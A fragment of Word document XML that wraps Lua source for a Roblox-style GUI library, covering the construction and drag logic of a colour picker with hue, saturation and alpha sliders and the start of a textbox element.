        <w:t xml:space="preserve">                        BackgroundTransparency = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 0, 0, 0);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ZIndex = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(25, 25, 29)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"colorpicker_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(22, 22, 24)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"colorpicker_components"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"saturation_holder" ] = library:create( "Frame" , {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Position = dim2(0, 7, 0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -14, 1, -80);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255, 39, 39)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"sat" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "saturation_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1,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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 2;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"sat"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Rotation = 270;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Transparency = numseq{numkey(0, 0), numkey(1, 1)};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "sat" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color = rgbseq{rgbkey(0, rgb(0, 0, 0)), rgbkey(1, rgb(0, 0, 0))}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"val" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "saturation_holder" ];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Parent = items[ "val" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Transparency = numseq{numkey(0, 0), numkey(1, 1)}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"val"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"saturation_holder"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"satvalpicker" ] = library:create( "TextButton" , {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vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "saturation_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 0, 4, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 8, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255,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"satvalpicker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 9999)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rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "satvalpicker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border;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"hue_gradient" ] = library:create( "TextButton" , {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Position = dim2(0, 10, 1, -64);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -20, 0, 8);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rgb(255, 0, 0)), rgbkey(0.17, rgb(255, 255, 0)), rgbkey(0.33, rgb(0, 255, 0)), rgbkey(0.5, rgb(0, 255, 255)), rgbkey(0.67, rgb(0, 0, 255)), rgbkey(0.83, rgb(255, 0, 255)), rgbkey(1, rgb(255, 0, 0))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "hue_gradient"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"hue_gradient"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"hue_picker" ] = library:create( "TextButton" , {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vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "hue_gradient" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 8, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255,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"hue_picker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 9999)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rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "hue_picker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border;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"alpha_gradient" ] = library:create( "TextButton" , {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Position = dim2(0, 10, 1, -46);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -20, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(25, 25, 29);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"alpha_gradient"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"alpha_picker" ] = library:create( "TextButton" , {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vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_gradient" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 8, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255,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"alpha_picker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 9999)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rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_picker"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rgb(0, 0, 0)), rgbkey(1, rgb(255, 255, 255))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_gradient"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"alpha_indicator" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ScaleType = Enum.ScaleType.Tile;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_gradient" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Image = "rbxassetid://18274452449";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Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TileSize = dim2(0, 6, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(0,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rgb(112, 112, 112)), rgbkey(1, rgb(255, 0, 0))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Transparency = numseq{numkey(0, 0.8062499761581421), numkey(1, 0)};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_indicator"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"alpha_indicator"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Rotation = 90;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color = rgbseq{rgbkey(0, rgb(255, 255, 255)), rgbkey(1, rgb(66, 66, 66))}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "input" ] = library:create( "TextBox" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(1, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "";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TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PlaceholderColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CursorPosition = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ClearTextOnFocus = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(72, 72, 72);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, -8, 1, -11);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -16, 0, 18);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(33, 33, 35)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }); 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"input" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 3)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"UICorenr" ] = library:create( "UICorner" , { -- fire misstypo (im not fixing this RAWR)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";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--                  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_visible(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_fade" ].BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_holder" ].Parent = bool and library[ "items" ] or library[ "other" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_holder" ].Position = dim_offset(items[ "colorpicker" ].AbsolutePosition.X, items[ "colorpicker" ].AbsolutePosition.Y + items[ "colorpicker" ].AbsoluteSize.Y + 45)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "colorpicker_fade" ], {BackgroundTransparency = 1}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "colorpicker_holder" ], {Position = items[ "colorpicker_holder" ].Position + dim_offset(0, 20)}) -- p100 check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (self.sanity and library.current_open == self and self.open) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:close_element(cfg)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function cfg.set(color, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(color) == "boolean" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if color then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    h, s, v = color:ToHSV()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if alpha then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    a = alpha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local Color = hsv(h, s, v)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Ok so quick story, should I cache any of this? no...?? anyways I know this code is very bad but its your fault for buying a ui with animations (on a serious note im too lazy to make this look nice)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Also further note, yeah I kind of did this scale_factor * size-valuesize.plane because then I would have to do tomfoolery to make it clip properly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "hue_picker" ], {Position = dim2(0, (items[ "hue_gradient" ].AbsoluteSize.X - items[ "hue_picker" ].AbsoluteSize.X) * h, 0.5, 0)}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "alpha_picker" ], {Position = dim2(0, (items[ "alpha_gradient" ].AbsoluteSize.X - items[ "alpha_picker" ].AbsoluteSize.X) * (1 - a), 0.5, 0)}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "satvalpicker" ], {Position = dim2(0, s * (items[ "saturation_holder" ].AbsoluteSize.X - items[ "satvalpicker" ].AbsoluteSize.X), 1, 1 - v * (items[ "saturation_holder" ].AbsoluteSize.Y - items[ "satvalpicker" ].AbsoluteSize.Y))}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "alpha_indicator" ]:FindFirstChildOfClass("UIGradient").Color = rgbseq{rgbkey(0, rgb(112, 112, 112)), rgbkey(1, hsv(h, 1, 1))}; -- shit code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker" ].BackgroundColor3 = Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_inline" ].BackgroundColor3 = Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "saturation_holder" ].BackgroundColor3 = hsv(h, 1, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "hue_picker" ].BackgroundColor3 = hsv(h, 1, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "alpha_picker" ].BackgroundColor3 = hsv(h, 1, 1 - a)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "satvalpicker" ].BackgroundColor3 = hsv(h, s, v)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = Color;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = a </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local color = items[ "colorpicker" ].BackgroundColor3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "input" ].Text = string.format("%s, %s, %s, ", library:round(color.R * 255), library:round(color.G * 255), library:round(color.B * 255))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "input" ].Text ..= library:round(1 - a, 0.01)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(Color, a)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cfg.update_color() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local mouse = uis:GetMouseLocation() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local offset = vec2(mouse.X, mouse.Y - gui_offset) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if dragging_sat then</w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    s = math.clamp((offset - items["sat"].AbsolutePosition).X / items["sat"].AbsoluteSize.X, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    v = 1 - math.clamp((offset - items["sat"].AbsolutePosition).Y / items["sat"].AbsoluteSize.Y, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif dragging_hue then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    h = math.clamp((offset - items[ "hue_gradient" ].AbsolutePosition).X / items[ "hue_gradient" ].AbsoluteSize.X, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif dragging_alpha then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    a = 1 - math.clamp((offset - items[ "alpha_gradient" ].AbsolutePosition).X / items[ "alpha_gradient" ].AbsoluteSize.X, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "colorpicker" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open = not cfg.open </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set_visible(cfg.open)            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            uis.InputChanged:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (dragging_sat or dragging_hue or dragging_alpha) and input.UserInputType == Enum.UserInputType.MouseMovement then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.update_color() 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library:connection(uis.InputEnded, function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.MouseButton1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging_sat = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging_hue = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging_alpha = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "alpha_gradient" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                dragging_alpha = true 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items[ "hue_gradient" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                dragging_hue = true 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items[ "sat" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                dragging_sat = true  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].FocusLost:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local text = items[ "input" ].Text</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local r, g, b, a = library:convert(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if r and g and b and a then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(rgb(r, g, b), 1 - a)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items[ "input" ].Focused:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].FocusLost:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(72, 72, 72)})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cfg.set(cfg.color, cfg.alpha)</w:t>
      </w:r>
    </w:p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library:textbox(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "TextBox",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                placeholder = options.placeholder or options.placeholdertext or options.holder or options.holdertext or "type here...",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = options.default or "",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                visible = options.visible or true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "textbox" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LayoutOrder = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;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"textbox"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"textbox"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4, 0, 19);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 12);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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FillDirection = Enum.FillDirection.Horizontal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"input" ] = library:create( "TextBox" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
